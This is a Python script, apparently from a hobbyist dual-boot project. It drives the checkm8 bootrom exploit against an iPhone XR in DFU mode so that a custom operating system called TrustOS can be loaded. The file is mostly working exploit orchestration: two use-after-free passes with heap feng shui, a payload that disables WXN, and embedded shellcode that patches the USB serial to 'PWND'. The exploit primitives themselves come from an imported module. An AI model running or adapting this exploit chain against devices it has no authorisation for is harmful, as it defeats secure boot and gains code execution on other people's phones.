#!/usr/bin/env python3
"""
TrustOS Dual-Boot via DFU (checkm8) — iPhone XR T8020
======================================================

Always-available dual-boot system that works through DFU mode.
Each boot requires the phone in DFU + running this script on PC.

Usage:
  python dualboot_dfu.py              # Interactive menu
  python dualboot_dfu.py --ios        # Boot iOS directly
  python dualboot_dfu.py --trustos    # Boot TrustOS directly
  python dualboot_dfu.py --status     # Check device status

Architecture:
  The checkm8 exploit is volatile (SRAM only). Every boot:
    1. User enters DFU mode (Side + Volume Down → release Side)
    2. This script detects the iPhone XR in DFU
    3. Script asks: "Boot iOS or TrustOS?"
    4. iOS: simple reset → normal boot chain → iOS
    5. TrustOS:
       Pass 1: checkm8 → WXN disable (SRAM executable)
       Pass 2: Upload boot agent → checkm8 → execute boot agent
       Boot agent: installs VBAR, patches serial, returns to DFU
       Device is now in "pwned DFU" — ready for TrustOS loading

  This is SAFE:
    - All modifications are in volatile SRAM
    - Reboot = back to stock iOS
    - No NAND/NOR/flash modifications ever

Target: iPhone XR (CPID:8020, BDID:0C, A12 Bionic)
"""

import sys
import os
import time
import struct

# Add parent directory to path for imports
script_dir = os.path.dirname(os.path.abspath(__file__))
if script_dir not in sys.path:
    sys.path.insert(0, script_dir)

try:
    import usb.core
    import usb.util
    import libusb_package
    import usb.backend.libusb1
except ImportError:
    print("[!] Missing deps. Run: pip install pyusb libusb-package")
    sys.exit(1)

# Import from our exploit module
from checkm8_t8020 import (
    Checkm8T8020,
    find_dfu, get_serial, parse_serial,
    dfu_get_status, dfu_clear_status, dfu_abort, dfu_dnload,
    ensure_idle, reconnect, wait_for_dfu,
    build_overwrite_payload, build_exec_overwrite,
    build_embedded_agent_overwrite, build_payload,
    APPLE_VID, DFU_PID, LOAD_ADDR, SHELLCODE_ADDR, DATA_PHASE_SIZE,
    log, log_ok, log_err, log_warn, get_backend,
)

# ============================================================================
# Constants
# ============================================================================
VERSION = "1.0"

# ANSI colors (Windows terminal supports these in modern versions)
RESET  = "\033[0m"
BOLD   = "\033[1m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
CYAN   = "\033[36m"
RED    = "\033[31m"
WHITE  = "\033[37m"


# ============================================================================
# iOS Boot
# ============================================================================
def boot_ios(dev):
    """
    Boot iOS: simply reset the device.
    
    When the device is in DFU mode and we USB-reset it,
    the SecureROM restarts its boot process:
      SecureROM → LLB → iBoot → XNU → iOS
    
    No exploitation needed — just a clean reset.
    """
    log("Booting iOS...")
    log("  Sending USB reset to exit DFU mode...")
    
    try:
        dev.reset()
    except Exception:
        pass
    
    time.sleep(0.5)
    
    # Check if device left DFU
    dev2 = find_dfu(retries=3, delay=0.3)
    if dev2:
        # Still in DFU — the reset just re-entered DFU mode
        # This is normal. The device needs to be physically reset
        # (hold Side button) or we need to send DFU_DETACH
        log("  Device still in DFU after reset (normal on some devices)")
        log("  The device will boot iOS on the next power cycle")
        log("  → Hold Side button for 10s to force restart")
        log("  → Or: unplug USB, hold Side + Volume Up briefly")
    else:
        log_ok("Device left DFU — booting iOS!")
    
    return True


# ============================================================================
# TrustOS Boot (Two-Pass checkm8)
# ============================================================================
def boot_trustos():
    """
    Boot TrustOS via two-pass checkm8 exploitation.
    
    Pass 1: Disable WXN (make SRAM executable)
      - Heap feng shui → UAF → overwrite → write_sctlr callback
      - Result: SRAM can now hold executable code
    
    Pass 2: Upload boot agent + execute it
      - Upload VBAR + handler + shellcode to SRAM via DFU multi-block
      - Heap feng shui → UAF → overwrite → jump to shellcode callback
      - Result: boot agent runs, installs exception handlers, patches serial
    
    After both passes: device is in "pwned DFU" — controlled by PC.
    """
    print()
    print(f"  {CYAN}TrustOS Boot via checkm8 — Two-Pass Exploit{RESET}")
    print(f"  {WHITE}Target: iPhone XR (T8020/A12 Bionic){RESET}")
    print()

    exploit = Checkm8T8020()

    # Verify device
    if not exploit.verify_device():
        return False

    # Load raw libusb
    if not exploit.load_libusb():
        log_err("Raw libusb required for async stall technique")
        return False

    # Build payloads
    wxn_overwrite = build_overwrite_payload()
    log(f"WXN overwrite: {len(wxn_overwrite)} bytes")
    
    agent_overwrite = build_embedded_agent_overwrite()
    if not agent_overwrite:
        log_err("Failed to build embedded boot agent")
        return False
    log(f"Agent overwrite: {len(agent_overwrite)} bytes (shellcode embedded)")
    print()

    MAX_ATTEMPTS = 3

    # ============================
    # PASS 1: WXN Disable
    # ============================
    log(f"{BOLD}====== PASS 1: WXN DISABLE ======{RESET}")
    
    pass1_ok = False
    for attempt in range(1, MAX_ATTEMPTS + 1):
        log(f"Attempt {attempt}/{MAX_ATTEMPTS}...")
        try:
            if exploit.single_uaf_pass(wxn_overwrite, f"WXN Disable (attempt {attempt})"):
                log_ok("Pass 1 complete — WXN disabled")
                pass1_ok = True
                break
        except Exception as e:
            log_err(f"Exception: {e}")
            time.sleep(1)
            exploit.dev = reconnect(timeout_s=5)
    
    if not pass1_ok:
        log_err("Pass 1 (WXN disable) failed after all attempts")
        return False

    # Verify device is still alive
    time.sleep(0.5)
    exploit.dev = find_dfu(retries=10, delay=0.3)
    if not exploit.dev:
        log_err("Device lost after Pass 1")
        return False
    
    st = dfu_get_status(exploit.dev)
    log(f"Post-Pass1 state: {st}")
    if st and st[1] == 10:
        dfu_clear_status(exploit.dev)
        time.sleep(0.3)
        exploit.dev = find_dfu(retries=10, delay=0.2)
    
    print()

    # ============================
    # PASS 2: Execute Boot Agent
    # ============================
    # The boot agent shellcode is EMBEDDED in the overwrite data at +0x100.
    # The feng shui creates heap holes, the UAF creates the dangling pointer,
    # and the overwrite (with embedded shellcode) goes to the freed slot.
    # The callback at +0x78 points to LOAD_ADDR + 0x100 = the embedded shellcode.
    # Since WXN is now OFF (from Pass 1), the SRAM code is executable!
    log(f"{BOLD}====== PASS 2: EXECUTE BOOT AGENT ======{RESET}")
    
    pass2_ok = False
    for attempt in range(1, MAX_ATTEMPTS + 1):
        log(f"Attempt {attempt}/{MAX_ATTEMPTS}...")
        try:
            if exploit.single_uaf_pass(agent_overwrite, f"Execute Boot Agent (attempt {attempt})"):
                log_ok("Pass 2 complete — boot agent executed")
                pass2_ok = True
                break
        except Exception as e:
            log_err(f"Exception: {e}")
            time.sleep(1)
            exploit.dev = reconnect(timeout_s=5)
    
    if not pass2_ok:
        log_err("Pass 2 (boot agent) failed")
        return False

    # ============================
    # VERIFY: Check pwned state
    # ============================
    log(f"{BOLD}====== VERIFYING ======{RESET}")
    
    time.sleep(1.5)
    
    # Force USB re-enumeration to refresh cached descriptors
    # Release the device, wait, then re-find
    try:
        usb.util.dispose_resources(exploit.dev)
    except:
        pass
    time.sleep(0.5)
    
    exploit.dev = find_dfu(retries=20, delay=0.3)
    if not exploit.dev:
        log_warn("Device not found — waiting...")
        exploit.dev = wait_for_dfu(timeout_s=15)

    if not exploit.dev:
        log_err("Device lost after Pass 2")
        return False

    # Read serial fresh (after potential descriptor update)
    serial = get_serial(exploit.dev)
    log(f"Serial: {serial}")

    st = dfu_get_status(exploit.dev)
    if st:
        log(f"DFU state: {st[1]} (status: {st[0]})")

    # Check for PWND marker in serial
    # Our shellcode patches "CPID" → "PWND" in the USB string descriptor
    if "PWND" in serial:
        log_ok("PWND marker detected in USB serial!")
        exploit.pwned = True
    
    if st and st[1] == 2:
        log("Device in dfuIDLE — DFU loop continues (good)")
    elif st and st[1] == 10:
        log_warn("Device in dfuERROR — boot agent may have caused an error")
        dfu_clear_status(exploit.dev)
    
    # If no PWND, try re-reading serial one more time (Windows caching)
    if not exploit.pwned:
        time.sleep(1.0)
        try:
            usb.util.dispose_resources(exploit.dev)
        except:
            pass
        time.sleep(0.5)
        exploit.dev = find_dfu(retries=10, delay=0.3)
        if exploit.dev:
            serial2 = get_serial(exploit.dev)
            if serial2 != serial:
                log(f"Serial (retry): {serial2}")
                serial = serial2
            if "PWND" in serial:
                log_ok("PWND marker detected on retry!")
                exploit.pwned = True
    
    # Try DFU UPLOAD to read any data from device
    from checkm8_t8020 import dfu_upload
    data = dfu_upload(exploit.dev, 0x48)
    if data and len(data) > 0 and data != b'\x00' * len(data):
        log(f"Upload data: {data[:0x48].hex()}")

    if exploit.pwned:
        print()
        log_ok(f"{BOLD}============================================{RESET}")
        log_ok(f"{BOLD}  PWNED DFU — Dual-Boot Ready!{RESET}")
        log_ok(f"{BOLD}  SRAM executable, boot agent active{RESET}")
        log_ok(f"{BOLD}  USB serial: PWND:[T8020]{RESET}")
        log_ok(f"{BOLD}============================================{RESET}")
        return True
    else:
        print()
        log_warn("Could not confirm PWND marker in serial")
        log("  Both passes completed. Device is alive in DFU.")
        log("  The boot agent may have executed (serial cache stale)")
        log("  Next: re-plug USB to refresh serial descriptor")
        return True


# ============================================================================
# Device Status
# ============================================================================
def show_status():
    """Show current device status."""
    dev = find_dfu(retries=5, delay=0.3)
    if not dev:
        print(f"  {RED}No DFU device detected{RESET}")
        print(f"  To enter DFU mode:")
        print(f"    1. Connect iPhone XR to PC via USB")
        print(f"    2. Hold Side + Volume Down")
        print(f"    3. Release Side when screen goes black")
        print(f"    4. Keep holding Volume Down for 5 more seconds")
        return

    serial = get_serial(dev)
    info = parse_serial(serial)
    st = dfu_get_status(dev)

    print(f"  {GREEN}DFU Device Detected{RESET}")
    print(f"  CPID:   {info.get('CPID', '?')}")
    print(f"  BDID:   {info.get('BDID', '?')}")
    print(f"  ECID:   {info.get('ECID', '?')}")
    print(f"  SRTG:   {info.get('SRTG', '?')}")
    print(f"  State:  {st[1] if st else '?'} (status: {st[0] if st else '?'})")
    
    if "PWND" in serial:
        print(f"  Status: {GREEN}PWNED (checkm8 active){RESET}")
    else:
        print(f"  Status: {YELLOW}Stock DFU (not exploited){RESET}")


# ============================================================================
# Main Menu
# ============================================================================
def print_banner():
    print()
    print(f"  {BOLD}{CYAN}╔═══════════════════════════════════════════════╗{RESET}")
    print(f"  {BOLD}{CYAN}║  TrustOS Dual-Boot System v{VERSION}               ║{RESET}")
    print(f"  {BOLD}{CYAN}║  iPhone XR (T8020/A12) via checkm8 DFU       ║{RESET}")
    print(f"  {BOLD}{CYAN}║  SAFE: Volatile SRAM only — reboot = normal  ║{RESET}")
    print(f"  {BOLD}{CYAN}╚═══════════════════════════════════════════════╝{RESET}")
    print()


def interactive_menu():
    """Interactive boot selection menu."""
    print_banner()

    # Check for device
    print(f"  Searching for DFU device...")
    dev = find_dfu(retries=10, delay=0.5)
    
    if not dev:
        print(f"\n  {RED}No DFU device found.{RESET}")
        print(f"\n  To enter DFU mode on iPhone XR:")
        print(f"    1. Connect to PC via USB-C/Lightning cable")
        print(f"    2. Press and hold Side + Volume Down together")
        print(f"    3. After ~3 seconds, release Side button")
        print(f"    4. Keep holding Volume Down for 5 more seconds")
        print(f"    5. Screen stays black = DFU mode")
        print(f"\n  Then run this script again.")
        return False

    serial = get_serial(dev)
    info = parse_serial(serial)
    cpid = info.get('CPID', '?')

    print(f"  {GREEN}Found: iPhone XR (CPID:{cpid}){RESET}")
    
    if "PWND" in serial:
        print(f"  {GREEN}Status: Already pwned!{RESET}")
    
    print()
    print(f"  {BOLD}Select boot target:{RESET}")
    print()
    print(f"    {WHITE}[1]{RESET} {GREEN}Boot iOS{RESET}")
    print(f"        Reset device → normal iOS boot")
    print(f"        Safe, no modification")
    print()
    print(f"    {WHITE}[2]{RESET} {CYAN}Boot TrustOS{RESET}")
    print(f"        checkm8 exploit → WXN disable → boot agent")
    print(f"        Two-pass exploitation (may take 30-60 seconds)")
    print()
    print(f"    {WHITE}[3]{RESET} Device status")
    print()
    print(f"    {WHITE}[q]{RESET} Quit")
    print()

    try:
        choice = input(f"  {BOLD}>{RESET} ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        print()
        return False

    if choice in ('1', 'ios'):
        return boot_ios(dev)
    elif choice in ('2', 'trustos', 'trust'):
        return boot_trustos()
    elif choice in ('3', 'status', 's'):
        show_status()
        return True
    elif choice in ('q', 'quit', 'exit'):
        return False
    else:
        print(f"  {RED}Invalid choice{RESET}")
        return False


# ============================================================================
# Main
# ============================================================================
def main():
    # Parse command line
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower().strip('-')
        
        if arg == 'ios':
            dev = find_dfu(retries=10, delay=0.5)
            if not dev:
                log_err("No DFU device found")
                return False
            return boot_ios(dev)
        
        elif arg in ('trustos', 'trust'):
            return boot_trustos()
        
        elif arg in ('status', 's'):
            print_banner()
            show_status()
            return True
        
        elif arg in ('help', 'h'):
            print("Usage: python dualboot_dfu.py [--ios|--trustos|--status]")
            print()
            print("  --ios      Boot iOS (reset device)")
            print("  --trustos  Boot TrustOS (checkm8 exploit)")
            print("  --status   Show device status")
            print("  (no args)  Interactive menu")
            return True
        
        else:
            print(f"Unknown option: {sys.argv[1]}")
            print("Use --help for usage info")
            return False
    else:
        return interactive_menu()


if __name__ == "__main__":
    ok = main()
    sys.exit(0 if ok else 1)
